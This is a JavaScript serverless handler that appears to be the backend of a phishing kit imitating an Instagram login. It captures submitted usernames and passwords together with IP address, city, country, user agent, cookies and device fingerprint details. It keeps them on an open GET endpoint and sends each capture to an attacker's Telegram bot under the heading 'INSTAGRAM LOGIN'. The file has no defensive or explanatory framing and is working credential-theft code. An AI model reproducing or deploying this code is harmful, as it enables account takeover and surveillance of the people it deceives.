let visits = [];

export default async function handler(req, res) {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') return res.status(200).end();

    // GET — panel admin baca data
    if (req.method === 'GET') {
        return res.status(200).json({ visits: visits.slice(0, 200) });
    }

    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    const { username, password, fingerprint } = req.body || {};

    const ip =
        req.headers['x-forwarded-for']?.split(',')[0].trim() ||
        req.headers['x-real-ip'] ||
        req.socket?.remoteAddress ||
        'unknown';

    const userAgent = req.headers['user-agent'] || 'unknown';
    const referer   = req.headers['referer'] || 'direct';
    const country   = req.headers['x-vercel-ip-country'] || 'unknown';
    const city      = req.headers['x-vercel-ip-city'] || 'unknown';
    const timestamp = new Date().toISOString();

    const entry = {
        username: username || '',
        password: password || '',
        ip,
        user_agent: userAgent,
        referer,
        country,
        city,
        timestamp,
        screen:   fingerprint?.screen || '',
        language: fingerprint?.language || '',
        timezone: fingerprint?.timezone || '',
        platform: fingerprint?.platform || '',
        cores:    fingerprint?.cores || '',
        cookies:  fingerprint?.cookies || ''
    };

    visits.unshift(entry);
    if (visits.length > 500) visits = visits.slice(0, 500);

    // Kirim ke Telegram
    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId   = process.env.TELEGRAM_CHAT_ID;

    if (botToken && chatId) {
        let message = '';
        if (username || password) {
            message += `🔥 INSTAGRAM LOGIN\n\n`;
            message += `Username: ${username || '-'}\n`;
            message += `Password: ${password || '-'}\n\n`;
        } else {
            message += `👁 NEW VISIT\n\n`;
        }
        message += `IP: ${ip}\n`;
        message += `Location: ${city}, ${country}\n`;
        message += `UA: ${userAgent}\n`;
        message += `Referer: ${referer}\n`;
        message += `Time: ${timestamp}\n`;

        if (fingerprint) {
            message += `\n📱 DEVICE\n`;
            message += `Screen: ${fingerprint.screen || '-'}\n`;
            message += `Lang: ${fingerprint.language || '-'}\n`;
            message += `Timezone: ${fingerprint.timezone || '-'}\n`;
            message += `Platform: ${fingerprint.platform || '-'}\n`;
        }

        try {
            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message,
                    disable_web_page_preview: true
                })
            });
        } catch (err) {
            console.error('Telegram send failed:', err);
        }
    }

    return res.status(200).json({ status: 'ok' });
}
